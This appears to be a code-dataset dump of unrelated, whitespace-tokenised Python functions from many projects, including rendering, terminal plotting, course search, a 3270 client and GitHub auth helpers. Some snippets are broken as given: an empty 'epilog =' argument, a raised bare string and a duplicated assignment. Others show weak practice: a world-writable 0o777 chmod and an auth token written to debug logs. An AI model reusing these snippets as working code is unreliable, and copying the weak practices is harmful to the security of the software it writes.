'{}': 'effect_packages' is of type {} instead of a list" . format ( name , type ( self . effects ) ) )
def load ( self ) : self . _open_image ( ) components , data = image_data ( self . image ) texture = self . ctx . texture ( self . image . size , components , data , ) texture . extra = { 'meta' : self . meta } if self . meta . mipmap : texture . build_mipmaps ( ) self . _close_image ( ) return texture
def from_single ( cls , meta : ProgramDescription , source : str ) : instance = cls ( meta ) instance . vertex_source = ShaderSource ( VERTEX_SHADER , meta . path or meta . vertex_shader , source ) if GEOMETRY_SHADER in source : instance . geometry_source = ShaderSource ( GEOMETRY_SHADER , meta . path or meta . geometry_shader , source , ) if FRAGMENT_SHADER in source : instance . fragment_source = ShaderSource ( FRAGMENT_SHADER , meta . path or meta . fragment_shader , source , ) if TESS_CONTROL_SHADER in source : instance . tess_control_source = ShaderSource ( TESS_CONTROL_SHADER , meta . path or meta . tess_control_shader , source , ) if TESS_EVALUATION_SHADER in source : instance . tess_evaluation_source = ShaderSource ( TESS_EVALUATION_SHADER , meta . path or meta . tess_evaluation_shader , source , ) return instance
def from_separate ( cls , meta : ProgramDescription , vertex_source , geometry_source = None , fragment_source = None , tess_control_source = None , tess_evaluation_source = None ) : instance = cls ( meta ) instance . vertex_source = ShaderSource ( VERTEX_SHADER , meta . path or meta . vertex_shader , vertex_source , ) if geometry_source : instance . geometry_source = ShaderSource ( GEOMETRY_SHADER , meta . path or meta . geometry_shader , geometry_source , ) if fragment_source : instance . fragment_source = ShaderSource ( FRAGMENT_SHADER , meta . path or meta . fragment_shader , fragment_source , ) if tess_control_source : instance . tess_control_source = ShaderSource ( TESS_CONTROL_SHADER , meta . path or meta . tess_control_shader , tess_control_source , ) if tess_evaluation_source : instance . tess_evaluation_source = ShaderSource ( TESS_EVALUATION_SHADER , meta . path or meta . tess_control_shader , tess_evaluation_source , ) return instance
def print ( self ) : print ( "---[ START {} ]---" . format ( self . name ) ) for i , line in enumerate ( self . lines ) : print ( "{}: {}" . format ( str ( i ) . zfill ( 3 ) , line ) ) print ( "---[ END {} ]---" . format ( self . name ) )
def load ( self ) : self . create_effect_classes ( ) self . _add_resource_descriptions_to_pools ( self . create_external_resources ( ) ) self . _add_resource_descriptions_to_pools ( self . create_resources ( ) ) for meta , resource in resources . textures . load_pool ( ) : self . _textures [ meta . label ] = resource for meta , resource in resources . programs . load_pool ( ) : self . _programs [ meta . label ] = resource for meta , resource in resources . scenes . load_pool ( ) : self . _scenes [ meta . label ] = resource for meta , resource in resources . data . load_pool ( ) : self . _data [ meta . label ] = resource self . create_effect_instances ( ) self . post_load ( )
def reload_programs ( self ) : print ( "Reloading programs:" ) for name , program in self . _programs . items ( ) : if getattr ( program , 'program' , None ) : print ( " - {}" . format ( program . meta . label ) ) program . program = resources . programs . load ( program . meta )
def image_data ( image ) : data = image . tobytes ( ) components = len ( data ) // ( image . size [ 0 ] * image . size [ 1 ] ) return components , data
def _find_last_of ( self , path , finders ) : found_path = None for finder in finders : result = finder . find ( path ) if result : found_path = result return found_path
def initial_sanity_check ( self ) : self . try_import ( self . project_name ) self . validate_name ( self . project_name ) if os . path . exists ( self . project_name ) : print ( "Directory {} already exist. Aborting." . format ( self . project_name ) ) return False if os . path . exists ( 'manage.py' ) : print ( "A manage.py file already exist in the current directory. Aborting." ) return False return True
def create_entrypoint ( self ) : with open ( os . path . join ( self . template_dir , 'manage.py' ) , 'r' ) as fd : data = fd . read ( ) . format ( project_name = self . project_name ) with open ( 'manage.py' , 'w' ) as fd : fd . write ( data ) os . chmod ( 'manage.py' , 0o777 )
def get_template_dir ( self ) : directory = os . path . dirname ( os . path . abspath ( __file__ ) ) directory = os . path . dirname ( os . path . dirname ( directory ) ) directory = os . path . join ( directory , 'project_template' ) return directory
def usage_function ( parser ) : parser . print_usage ( ) print ( '' ) print ( 'available functions:' ) for function in sorted ( FUNCTION ) : doc = FUNCTION [ function ] . __doc__ . strip ( ) . splitlines ( ) [ 0 ] print ( '    %-12s %s' % ( function + ':' , doc ) ) return 0
def usage_palette ( parser ) : parser . print_usage ( ) print ( '' ) print ( 'available palettes:' ) for palette in sorted ( PALETTE ) : print ( '    %-12s' % ( palette , ) ) return 0
def run ( ) : import argparse parser = argparse . ArgumentParser ( description = ( 'Text mode diagrams using UTF-8 characters and fancy colors.' ) , epilog = , ) group = parser . add_argument_group ( 'optional drawing mode' ) group . add_argument ( '-G' , '--graph' , dest = 'mode' , action = 'store_const' , const = 'g' , help = 'axis drawing mode (default)' , ) group . add_argument ( '-H' , '--horizontal-bars' , dest = 'mode' , action = 'store_const' , const = 'h' , help = 'horizontal drawing mode' , ) group . add_argument ( '-V' , '--vertical-bars' , dest = 'mode' , action = 'store_const' , const = 'v' , help = 'vertical drawing mode' , ) group = parser . add_argument_group ( 'optional drawing arguments' ) group . add_argument ( '-a' , '--axis' , dest = 'axis' , action = 'store_const' , const = True , default = True , help = 'draw axis (default: yes)' , ) group . add_argument ( '-A' , '--no-axis' , dest = 'axis' , action = 'store_const' , const = False , help = "don't draw axis" , ) group . add_argument ( '-c' , '--color' , dest = 'color' , action = 'store_const' , const = True , default = True , help = 'use colors (default: yes)' , ) group . add_argument ( '-C' , '--no-color' , dest = 'color' , action = 'store_const' , const = False , help = "don't use colors" , ) group . add_argument ( '-l' , '--legend' , dest = 'legend' , action = 'store_const' , const = True , default = True , help = 'draw y-axis legend (default: yes)' , ) group . add_argument ( '-L' , '--no-legend' , dest = 'legend' , action = 'store_const' , const = False , help = "don't draw y-axis legend" , ) group . add_argument ( '-f' , '--function' , default = None , metavar = 'function' , help = 'curve manipulation function, use "help" for a list' , ) group . add_argument ( '-p' , '--palette' , default = 'default' , metavar = 'palette' , help = 'palette name, use "help" for a list' , ) group . add_argument ( '-x' , '--width' , default = 0 , type = int , metavar = 'characters' , help = 'drawing width (default: auto)' , ) group . add_argument ( '-y' , '--height' , default = 0 , type = int , metavar = 'characters' , help = 'drawing height (default: auto)' , ) group . add_argument ( '-r' , '--reverse' , default = False , action = 'store_true' , help = 'reverse draw graph' , ) group . add_argument ( '--sort-by-column' , default = 0 , type = int , metavar = 'index' , help = 'sort input data based on given column' , ) group = parser . add_argument_group ( 'optional input and output arguments' ) group . add_argument ( '-b' , '--batch' , default = False , action = 'store_true' , help = 'batch mode (default: no)' , ) group . add_argument ( '-k' , '--keys' , default = False , action = 'store_true' , help = 'input are key-value pairs (default: no) (1)' , ) group . add_argument ( '-s' , '--sleep' , default = 0 , type = float , help = 'batch poll sleep time (default: none)' , ) group . add_argument ( '-i' , '--input' , default = '-' , metavar = 'file' , help = 'input file (default: stdin)' , ) group . add_argument ( '-o' , '--output' , default = '-' , metavar = 'file' , help = 'output file (default: stdout)' , ) group . add_argument ( '-e' , '--encoding' , dest = 'encoding' , default = '' , help = 'output encoding (default: auto)' , ) option = parser . parse_args ( ) if option . function == 'help' : return usage_function ( parser ) if option . palette == 'help' : return usage_palette ( parser ) option . mode = option . mode or 'g' option . size = Point ( ( option . width , option . height ) ) if option . input in [ '-' , 'stdin' ] : istream = sys . stdin else : istream = open ( option . input , 'r' ) if option . output in [ '-' , 'stdout' ] : try : ostream = sys . stdout . buffer except AttributeError : ostream = sys . stdout else : ostream = open ( option . output , 'wb' ) option . encoding = option . encoding or Terminal ( ) . encoding if option . mode == 'g' : engine = AxisGraph ( option . size , option ) elif option . mode == 'h' : engine = HorizontalBarGraph ( option . size , option ) elif option . mode == 'v' : engine = VerticalBarGraph ( option . size , option ) else : parser . error ( 'invalid mode' ) return 1 engine . consume ( istream , ostream , batch = option . batch )
def size ( self ) : for fd in range ( 3 ) : cr = self . _ioctl_GWINSZ ( fd ) if cr : break if not cr : try : fd = os . open ( os . ctermid ( ) , os . O_RDONLY ) cr = self . _ioctl_GWINSZ ( fd ) os . close ( fd ) except Exception : pass if not cr : env = os . environ cr = ( env . get ( 'LINES' , 25 ) , env . get ( 'COLUMNS' , 80 ) ) return int ( cr [ 1 ] ) , int ( cr [ 0 ] )
def csi ( self , capname , * args ) : value = curses . tigetstr ( capname ) if value is None : return b'' else : return curses . tparm ( value , * args )
def csi_wrap ( self , value , capname , * args ) : if isinstance ( value , str ) : value = value . encode ( 'utf-8' ) return b'' . join ( [ self . csi ( capname , * args ) , value , self . csi ( 'sgr0' ) , ] )
def consume ( self , istream , ostream , batch = False ) : datapoints = [ ] # List of 2-tuples if batch : sleep = max ( 0.01 , self . option . sleep ) fd = istream . fileno ( ) while True : try : if select . select ( [ fd ] , [ ] , [ ] , sleep ) : try : line = istream . readline ( ) if line == '' : break datapoints . append ( self . consume_line ( line ) ) except ValueError : continue if self . option . sort_by_column : datapoints = sorted ( datapoints , key = itemgetter ( self . option . sort_by_column - 1 ) ) if len ( datapoints ) > 1 : datapoints = datapoints [ - self . maximum_points : ] self . update ( [ dp [ 0 ] for dp in datapoints ] , [ dp [ 1 ] for dp in datapoints ] ) self . render ( ostream ) time . sleep ( sleep ) except KeyboardInterrupt : break else : for line in istream : try : datapoints . append ( self . consume_line ( line ) ) except ValueError : pass if self . option . sort_by_column : datapoints = sorted ( datapoints , key = itemgetter ( self . option . sort_by_column - 1 ) ) self . update ( [ dp [ 0 ] for dp in datapoints ] , [ dp [ 1 ] for dp in datapoints ] ) self . render ( ostream )
def consume_line ( self , line ) : data = RE_VALUE_KEY . split ( line . strip ( ) , 1 ) if len ( data ) == 1 : return float ( data [ 0 ] ) , None else : return float ( data [ 0 ] ) , data [ 1 ] . strip ( )
def update ( self , points , values = None ) : self . values = values or [ None ] * len ( points ) if np is None : if self . option . function : warnings . warn ( 'numpy not available, function ignored' ) self . points = points self . minimum = min ( self . points ) self . maximum = max ( self . points ) self . current = self . points [ - 1 ] else : self . points = self . apply_function ( points ) self . minimum = np . min ( self . points ) self . maximum = np . max ( self . points ) self . current = self . points [ - 1 ] if self . maximum == self . minimum : self . extents = 1 else : self . extents = ( self . maximum - self . minimum ) self . extents = ( self . maximum - self . minimum )
def color_ramp ( self , size ) : color = PALETTE . get ( self . option . palette , { } ) color = color . get ( self . term . colors , None ) color_ramp = [ ] if color is not None : ratio = len ( color ) / float ( size ) for i in range ( int ( size ) ) : color_ramp . append ( self . term . color ( color [ int ( ratio * i ) ] ) ) return color_ramp
def human ( self , size , base = 1000 , units = ' kMGTZ' ) : sign = '+' if size >= 0 else '-' size = abs ( size ) if size < 1000 : return '%s%d' % ( sign , size ) for i , suffix in enumerate ( units ) : unit = 1000 ** ( i + 1 ) if size < unit : return ( '%s%.01f%s' % ( sign , size / float ( unit ) * base , suffix , ) ) . strip ( ) raise OverflowError
def apply_function ( self , points ) : if not self . option . function : return points if np is None : raise ImportError ( 'numpy is not available' ) if ':' in self . option . function : function , arguments = self . option . function . split ( ':' , 1 ) arguments = arguments . split ( ',' ) else : function = self . option . function arguments = [ ] # Resolve arguments arguments = list ( map ( self . _function_argument , arguments ) ) # Resolve function filter_function = FUNCTION . get ( function ) if filter_function is None : raise TypeError ( 'Invalid function "%s"' % ( function , ) ) else : # We wrap in ``list()`` to consume generators and iterators, as # ``np.array`` doesn't do this for us. return filter_function ( np . array ( list ( points ) ) , * arguments )
def line ( self , p1 , p2 , resolution = 1 ) : xdiff = max ( p1 . x , p2 . x ) - min ( p1 . x , p2 . x ) ydiff = max ( p1 . y , p2 . y ) - min ( p1 . y , p2 . y ) xdir = [ - 1 , 1 ] [ int ( p1 . x <= p2 . x ) ] ydir = [ - 1 , 1 ] [ int ( p1 . y <= p2 . y ) ] r = int ( round ( max ( xdiff , ydiff ) ) ) if r == 0 : return for i in range ( ( r + 1 ) * resolution ) : x = p1 . x y = p1 . y if xdiff : x += ( float ( i ) * xdiff ) / r * xdir / resolution if ydiff : y += ( float ( i ) * ydiff ) / r * ydir / resolution yield Point ( ( x , y ) )
def set_text ( self , point , text ) : if not self . option . legend : return if not isinstance ( point , Point ) : point = Point ( point ) for offset , char in enumerate ( str ( text ) ) : self . screen . canvas [ point . y ] [ point . x + offset ] = char
def render ( self , stream ) : encoding = self . option . encoding or self . term . encoding or "utf8" if self . option . color : ramp = self . color_ramp ( self . size . y ) [ : : - 1 ] else : ramp = None if self . cycle >= 1 and self . lines : stream . write ( self . term . csi ( 'cuu' , self . lines ) ) zero = int ( self . null / 4 ) # Zero crossing lines = 0 for y in range ( self . screen . size . y ) : if y == zero and self . size . y > 1 : stream . write ( self . term . csi ( 'smul' ) ) if ramp : stream . write ( ramp [ y ] ) for x in range ( self . screen . size . x ) : point = Point ( ( x , y ) ) if point in self . screen : value = self . screen [ point ] if isinstance ( value , int ) : stream . write ( chr ( self . base + value ) . encode ( encoding ) ) else : stream . write ( self . term . csi ( 'sgr0' ) ) stream . write ( self . term . csi_wrap ( value . encode ( encoding ) , 'bold' ) ) if y == zero and self . size . y > 1 : stream . write ( self . term . csi ( 'smul' ) ) if ramp : stream . write ( ramp [ y ] ) else : stream . write ( b' ' ) if y == zero and self . size . y > 1 : stream . write ( self . term . csi ( 'rmul' ) ) if ramp : stream . write ( self . term . csi ( 'sgr0' ) ) stream . write ( b'\n' ) lines += 1 stream . flush ( ) self . cycle = self . cycle + 1 self . lines = lines
def _normalised_numpy ( self ) : dx = ( self . screen . width / float ( len ( self . points ) ) ) oy = ( self . screen . height ) points = np . array ( self . points ) - self . minimum points = points * 4.0 / self . extents * self . size . y for x , y in enumerate ( points ) : yield Point ( ( dx * x , min ( oy , oy - y ) , ) )
def _normalised_python ( self ) : dx = ( self . screen . width / float ( len ( self . points ) ) ) oy = ( self . screen . height ) for x , point in enumerate ( self . points ) : y = ( point - self . minimum ) * 4.0 / self . extents * self . size . y yield Point ( ( dx * x , min ( oy , oy - y ) , ) )
def null ( self ) : if not self . option . axis : return - 1 else : return self . screen . height - ( - self . minimum * 4.0 / self . extents * self . size . y )
def mem_size ( self ) : data_len = self . _data_mem_size node_count = len ( list ( self . xml_doc . iter ( tag = etree . Element ) ) ) if self . compressed : size = 52 * node_count + data_len + 630 else : tags_len = 0 for e in self . xml_doc . iter ( tag = etree . Element ) : e_len = max ( len ( e . tag ) , 8 ) e_len = ( e_len + 3 ) & ~ 3 tags_len += e_len size = 56 * node_count + data_len + 630 + tags_len # debugging #print('nodes:{} ({}) data:{} ({})'.format(node_count,hex(node_count), data_len, hex(data_len))) return ( size + 8 ) & ~ 7
def _load_class ( class_path , default ) : if class_path is None : return default component = class_path . rsplit ( '.' , 1 ) result_processor = getattr ( importlib . import_module ( component [ 0 ] ) , component [ 1 ] , default ) if len ( component ) > 1 else default return result_processor
def _process_pagination_values ( request ) : size = 20 page = 0 from_ = 0 if "page_size" in request . POST : size = int ( request . POST [ "page_size" ] ) max_page_size = getattr ( settings , "SEARCH_MAX_PAGE_SIZE" , 100 ) # The parens below are superfluous, but make it much clearer to the reader what is going on if not ( 0 < size <= max_page_size ) : # pylint: disable=superfluous-parens raise ValueError ( _ ( 'Invalid page size of {page_size}' ) . format ( page_size = size ) ) if "page_index" in request . POST : page = int ( request . POST [ "page_index" ] ) from_ = page * size return size , from_ , page
def _process_field_values ( request ) : return { field_key : request . POST [ field_key ] for field_key in request . POST if field_key in course_discovery_filter_fields ( ) }
def _translate_hits ( es_response ) : def translate_result ( result ) : """ Any conversion from ES result syntax into our search engine syntax """ translated_result = copy . copy ( result ) data = translated_result . pop ( "_source" ) translated_result . update ( { "data" : data , "score" : translated_result [ "_score" ] } ) return translated_result def translate_facet ( result ) : """ Any conversion from ES facet syntax into our search engine sytax """ terms = { term [ "term" ] : term [ "count" ] for term in result [ "terms" ] } return { "terms" : terms , "total" : result [ "total" ] , "other" : result [ "other" ] , } results = [ translate_result ( hit ) for hit in es_response [ "hits" ] [ "hits" ] ] response = { "took" : es_response [ "took" ] , "total" : es_response [ "hits" ] [ "total" ] , "max_score" : es_response [ "hits" ] [ "max_score" ] , "results" : results , } if "facets" in es_response : response [ "facets" ] = { facet : translate_facet ( es_response [ "facets" ] [ facet ] ) for facet in es_response [ "facets" ] } return response
def _get_filter_field ( field_name , field_value ) : filter_field = None if isinstance ( field_value , ValueRange ) : range_values = { } if field_value . lower : range_values . update ( { "gte" : field_value . lower_string } ) if field_value . upper : range_values . update ( { "lte" : field_value . upper_string } ) filter_field = { "range" : { field_name : range_values } } elif _is_iterable ( field_value ) : filter_field = { "terms" : { field_name : field_value } } else : filter_field = { "term" : { field_name : field_value } } return filter_field
def _process_facet_terms ( facet_terms ) : elastic_facets = { } for facet in facet_terms : facet_term = { "field" : facet } if facet_terms [ facet ] : for facet_option in facet_terms [ facet ] : facet_term [ facet_option ] = facet_terms [ facet ] [ facet_option ] elastic_facets [ facet ] = { "terms" : facet_term } return elastic_facets
def get_mappings ( cls , index_name , doc_type ) : return cache . get ( cls . get_cache_item_name ( index_name , doc_type ) , { } )
def set_mappings ( cls , index_name , doc_type , mappings ) : cache . set ( cls . get_cache_item_name ( index_name , doc_type ) , mappings )
def log_indexing_error ( cls , indexing_errors ) : indexing_errors_log = [ ] for indexing_error in indexing_errors : indexing_errors_log . append ( str ( indexing_error ) ) raise exceptions . ElasticsearchException ( ', ' . join ( indexing_errors_log ) )
def remove ( self , doc_type , doc_ids , * * kwargs ) : try : # ignore is flagged as an unexpected-keyword-arg; ES python client documents that it can be used # pylint: disable=unexpected-keyword-arg actions = [ ] for doc_id in doc_ids : log . debug ( "Removing document of type %s and index %s" , doc_type , doc_id ) action = { '_op_type' : 'delete' , "_index" : self . index_name , "_type" : doc_type , "_id" : doc_id } actions . append ( action ) bulk ( self . _es , actions , * * kwargs ) except BulkIndexError as ex : valid_errors = [ error for error in ex . errors if error [ 'delete' ] [ 'status' ] != 404 ] if valid_errors : log . exception ( "An error occurred while removing documents from the index." ) raise
def perform_search ( search_term , user = None , size = 10 , from_ = 0 , course_id = None ) : # field_, filter_ and exclude_dictionary(s) can be overridden by calling application # field_dictionary includes course if course_id provided ( field_dictionary , filter_dictionary , exclude_dictionary ) = SearchFilterGenerator . generate_field_filters ( user = user , course_id = course_id ) searcher = SearchEngine . get_search_engine ( getattr ( settings , "COURSEWARE_INDEX_NAME" , "courseware_index" ) ) if not searcher : raise NoSearchEngineError ( "No search engine specified in settings.SEARCH_ENGINE" ) results = searcher . search_string ( search_term , field_dictionary = field_dictionary , filter_dictionary = filter_dictionary , exclude_dictionary = exclude_dictionary , size = size , from_ = from_ , doc_type = "courseware_content" , ) # post-process the result for result in results [ "results" ] : result [ "data" ] = SearchResultProcessor . process_result ( result [ "data" ] , search_term , user ) results [ "access_denied_count" ] = len ( [ r for r in results [ "results" ] if r [ "data" ] is None ] ) results [ "results" ] = [ r for r in results [ "results" ] if r [ "data" ] is not None ] return results
def course_discovery_search ( search_term = None , size = 20 , from_ = 0 , field_dictionary = None ) : # We'll ignore the course-enrollemnt informaiton in field and filter # dictionary, and use our own logic upon enrollment dates for these use_search_fields = [ "org" ] ( search_fields , _ , exclude_dictionary ) = SearchFilterGenerator . generate_field_filters ( ) use_field_dictionary = { } use_field_dictionary . update ( { field : search_fields [ field ] for field in search_fields if field in use_search_fields } ) if field_dictionary : use_field_dictionary . update ( field_dictionary ) if not getattr ( settings , "SEARCH_SKIP_ENROLLMENT_START_DATE_FILTERING" , False ) : use_field_dictionary [ "enrollment_start" ] = DateRange ( None , datetime . utcnow ( ) ) searcher = SearchEngine . get_search_engine ( getattr ( settings , "COURSEWARE_INDEX_NAME" , "courseware_index" ) ) if not searcher : raise NoSearchEngineError ( "No search engine specified in settings.SEARCH_ENGINE" ) results = searcher . search ( query_string = search_term , doc_type = "course_info" , size = size , from_ = from_ , # only show when enrollment start IS provided and is before now field_dictionary = use_field_dictionary , # show if no enrollment end is provided and has not yet been reached filter_dictionary = { "enrollment_end" : DateRange ( datetime . utcnow ( ) , None ) } , exclude_dictionary = exclude_dictionary , facet_terms = course_discovery_facets ( ) , ) return results
def strings_in_dictionary ( dictionary ) : strings = [ value for value in six . itervalues ( dictionary ) if not isinstance ( value , dict ) ] for child_dict in [ dv for dv in six . itervalues ( dictionary ) if isinstance ( dv , dict ) ] : strings . extend ( SearchResultProcessor . strings_in_dictionary ( child_dict ) ) return strings
def find_matches ( strings , words , length_hoped ) : lower_words = [ w . lower ( ) for w in words ] def has_match ( string ) : """ Do any of the words match within the string """ lower_string = string . lower ( ) for test_word in lower_words : if test_word in lower_string : return True return False shortened_strings = [ textwrap . wrap ( s ) for s in strings ] short_string_list = list ( chain . from_iterable ( shortened_strings ) ) matches = [ ms for ms in short_string_list if has_match ( ms ) ] cumulative_len = 0 break_at = None for idx , match in enumerate ( matches ) : cumulative_len += len ( match ) if cumulative_len >= length_hoped : break_at = idx break return matches [ 0 : break_at ]
def decorate_matches ( match_in , match_word ) : matches = re . finditer ( match_word , match_in , re . IGNORECASE ) for matched_string in set ( [ match . group ( ) for match in matches ] ) : match_in = match_in . replace ( matched_string , getattr ( settings , "SEARCH_MATCH_DECORATION" , u"<b>{}</b>" ) . format ( matched_string ) ) return match_in
def excerpt ( self ) : if "content" not in self . _results_fields : return None match_phrases = [ self . _match_phrase ] if six . PY2 : separate_phrases = [ phrase . decode ( 'utf-8' ) for phrase in shlex . split ( self . _match_phrase . encode ( 'utf-8' ) ) ] else : separate_phrases = [ phrase for phrase in shlex . split ( self . _match_phrase ) ] if len ( separate_phrases ) > 1 : match_phrases . extend ( separate_phrases ) else : match_phrases = separate_phrases matches = SearchResultProcessor . find_matches ( SearchResultProcessor . strings_in_dictionary ( self . _results_fields [ "content" ] ) , match_phrases , DESIRED_EXCERPT_LENGTH ) excerpt_text = ELLIPSIS . join ( matches ) for match_word in match_phrases : excerpt_text = SearchResultProcessor . decorate_matches ( excerpt_text , match_word ) return excerpt_text
def _parse ( self , filename ) : self . names = { } with codecs . open ( filename , encoding = "iso8859-1" ) as f : for line in f : if any ( map ( lambda c : 128 < ord ( c ) < 160 , line ) ) : line = line . encode ( "iso8859-1" ) . decode ( "windows-1252" ) self . _eat_name_line ( line . strip ( ) )
def _eat_name_line ( self , line ) : if line [ 0 ] not in "#=" : parts = line . split ( ) country_values = line [ 30 : - 1 ] name = map_name ( parts [ 1 ] ) if not self . case_sensitive : name = name . lower ( ) if parts [ 0 ] == "M" : self . _set ( name , u"male" , country_values ) elif parts [ 0 ] == "1M" or parts [ 0 ] == "?M" : self . _set ( name , u"mostly_male" , country_values ) elif parts [ 0 ] == "F" : self . _set ( name , u"female" , country_values ) elif parts [ 0 ] == "1F" or parts [ 0 ] == "?F" : self . _set ( name , u"mostly_female" , country_values ) elif parts [ 0 ] == "?" : self . _set ( name , self . unknown_value , country_values ) else : raise "Not sure what to do with a sex of %s" % parts [ 0 ]
def _set ( self , name , gender , country_values ) : if '+' in name : for replacement in [ '' , ' ' , '-' ] : self . _set ( name . replace ( '+' , replacement ) , gender , country_values ) else : if name not in self . names : self . names [ name ] = { } self . names [ name ] [ gender ] = country_values
def _most_popular_gender ( self , name , counter ) : if name not in self . names : return self . unknown_value max_count , max_tie = ( 0 , 0 ) best = self . names [ name ] . keys ( ) [ 0 ] for gender , country_values in self . names [ name ] . items ( ) : count , tie = counter ( country_values ) if count > max_count or ( count == max_count and tie > max_tie ) : max_count , max_tie , best = count , tie , gender return best if max_count > 0 else self . unknown_value
def get_gender ( self , name , country = None ) : if not self . case_sensitive : name = name . lower ( ) if name not in self . names : return self . unknown_value elif not country : def counter ( country_values ) : country_values = map ( ord , country_values . replace ( " " , "" ) ) return ( len ( country_values ) , sum ( map ( lambda c : c > 64 and c - 55 or c - 48 , country_values ) ) ) return self . _most_popular_gender ( name , counter ) elif country in self . __class__ . COUNTRIES : index = self . __class__ . COUNTRIES . index ( country ) counter = lambda e : ( ord ( e [ index ] ) - 32 , 0 ) return self . _most_popular_gender ( name , counter ) else : raise NoCountryError ( "No such country: %s" % country )
def is_connected ( self ) : # need to wrap in try/except b/c of wc3270's socket connection dynamics try : # this is basically a no-op, but it results in the the current status # getting updated self . exec_command ( b"Query(ConnectionState)" ) # connected status is like 'C(192.168.1.1)', disconnected is 'N' return self . status . connection_state . startswith ( b"C(" ) except NotConnectedException : return False
def connect ( self , host ) : if not self . app . connect ( host ) : command = "Connect({0})" . format ( host ) . encode ( "ascii" ) self . exec_command ( command ) self . last_host = host
def signature_matches ( func , args = ( ) , kwargs = { } ) : try : sig = inspect . signature ( func ) sig . bind ( * args , * * kwargs ) except TypeError : return False else : return True
def register_chooser ( self , chooser , * * kwargs ) : if not issubclass ( chooser , Chooser ) : return self . register_simple_chooser ( chooser , * * kwargs ) self . choosers [ chooser . model ] = chooser ( * * kwargs ) return chooser
def from_json_list ( cls , api_client , data ) : return [ cls . from_json ( api_client , item ) for item in data ]
def from_json ( cls , api_client , data ) : self = cls ( api_client ) PandoraModel . populate_fields ( api_client , self , data ) return self
def _base_repr ( self , and_also = None ) : items = [ "=" . join ( ( key , repr ( getattr ( self , key ) ) ) ) for key in sorted ( self . _fields . keys ( ) ) ] if items : output = ", " . join ( items ) else : output = None if and_also : return "{}({}, {})" . format ( self . __class__ . __name__ , output , and_also ) else : return "{}({})" . format ( self . __class__ . __name__ , output )
def _send_cmd ( self , cmd ) : self . _process . stdin . write ( "{}\n" . format ( cmd ) . encode ( "utf-8" ) ) self . _process . stdin . flush ( )
def _ensure_started ( self ) : if self . _process and self . _process . poll ( ) is None : return if not getattr ( self , "_cmd" ) : raise RuntimeError ( "Player command is not configured" ) log . debug ( "Starting playback command: %r" , self . _cmd ) self . _process = SilentPopen ( self . _cmd ) self . _post_start ( )
def station_selection_menu ( self , error = None ) : self . screen . clear ( ) if error : self . screen . print_error ( "{}\n" . format ( error ) ) for i , station in enumerate ( self . stations ) : i = "{:>3}" . format ( i ) print ( "{}: {}" . format ( Colors . yellow ( i ) , station . name ) ) return self . stations [ self . screen . get_integer ( "Station: " ) ]
def input ( self , input , song ) : try : cmd = getattr ( self , self . CMD_MAP [ input ] [ 1 ] ) except ( IndexError , KeyError ) : return self . screen . print_error ( "Invalid command {!r}!" . format ( input ) ) cmd ( song )
def poll ( self ) : ret = self . communicationChannel . receive_finished ( ) self . nruns -= len ( ret ) return ret
def end ( self ) : results = self . communicationChannel . receive ( ) if self . nruns != len ( results ) : import logging logger = logging . getLogger ( __name__ ) # logger.setLevel(logging.DEBUG) logger . warning ( 'too few results received: {} results received, {} expected' . format ( len ( results ) , self . nruns ) ) return results
def _expand_str ( path_cfg , alias_dict , overriding_kargs ) : if path_cfg in alias_dict : # e.g., path_cfg = 'var_cut' return _expand_str_alias ( path_cfg , alias_dict , overriding_kargs ) # e.g., path_cfg = 'ev : {low} <= ev.var[0] < {high}' return _expand_for_lambda_str ( path_cfg , alias_dict , overriding_kargs )
def _expand_tuple ( path_cfg , alias_dict , overriding_kargs ) : # e.g., # path_cfg = ('ev : {low} <= ev.var[0] < {high}', {'low': 10, 'high': 200}) # overriding_kargs = {'alias': 'var_cut', 'name': 'var_cut25', 'low': 25} new_path_cfg = path_cfg [ 0 ] # e.g., 'ev : {low} <= ev.var[0] < {high}' new_overriding_kargs = path_cfg [ 1 ] . copy ( ) # e.g., {'low': 10, 'high': 200} new_overriding_kargs . update ( overriding_kargs ) # e.g., {'low': 25, 'high': 200, 'alias': 'var_cut', 'name': 'var_cut25'} return expand_path_cfg ( new_path_cfg , overriding_kargs = new_overriding_kargs , alias_dict = alias_dict )
def wait ( self ) : finished_pids = [ ] while self . running_procs : finished_pids . extend ( self . poll ( ) ) return finished_pids
def getVector ( self , tree , branchName ) : if ( tree , branchName ) in self . __class__ . addressDict : return self . __class__ . addressDict [ ( tree , branchName ) ] itsVector = self . _getVector ( tree , branchName ) self . __class__ . addressDict [ ( tree , branchName ) ] = itsVector return itsVector
def _handleAuth ( fn ) : @ functools . wraps ( fn ) def wrapped ( * args , * * kwargs ) : # if yotta is being run noninteractively, then we never retry, but we # do call auth.authorizeUser, so that a login URL can be displayed: interactive = globalconf . get ( 'interactive' ) def retryWithAuthOrRaise ( original_exception ) : # in all cases ask for auth, so that in non-interactive mode a # login URL is displayed auth . authorizeUser ( provider = 'github' , interactive = interactive ) if not interactive : raise original_exception else : logger . debug ( 'trying with authtoken: %s' , settings . getProperty ( 'github' , 'authtoken' ) ) return fn ( * args , * * kwargs ) # authorised requests have a higher rate limit, but display a warning # message in this case, as the user might not expect the requirement to # auth: def handleRateLimitExceeded ( original_exception ) : if not _userAuthedWithGithub ( ) : logger . warning ( 'github rate limit for anonymous requests exceeded: you must log in' ) return retryWithAuthOrRaise ( original_exception ) else : raise original_exception try : return fn ( * args , * * kwargs ) except requests . exceptions . HTTPError as e : if e . response . status_code == 403 : # 403 = rate limit exceeded return handleRateLimitExceeded ( e ) if e . response . status_code == 401 : # 401 = unauthorised return retryWithAuthOrRaise ( e ) raise except github . BadCredentialsException as e : logger . debug ( "github: bad credentials" ) return retryWithAuthOrRaise ( e ) except github . UnknownObjectException as e : logger . debug ( "github: unknown object" ) # some endpoints return 404 if the user doesn't have access, maybe # it would be better to prompt for another username and password, # and store multiple tokens that we can try for each request.... # but for now we assume that if the user is logged in then a 404 # really is a 404 if not _userAuthedWithGithub ( ) : logger . info ( 'failed to fetch Github object, re-trying with authentication...' ) return retryWithAuthOrRaise ( e ) raise except github . RateLimitExceededException as e : return handleRateLimitExceeded ( e ) except github . GithubException as e : if e . status == 403 : # 403 = rate limit exceeded return handleRateLimitExceeded ( e ) raise return wrapped
def _getTipArchiveURL ( repo ) : g = Github ( settings . getProperty ( 'github' , 'authtoken' ) ) repo = g . get_repo ( repo ) return repo . get_archive_link ( 'tarball' )
def _getCommitArchiveURL ( repo , commit ) : g = Github ( settings . getProperty ( 'github' , 'authtoken' ) ) repo = g . get_repo ( repo ) return repo . get_archive_link ( 'tarball' , commit )
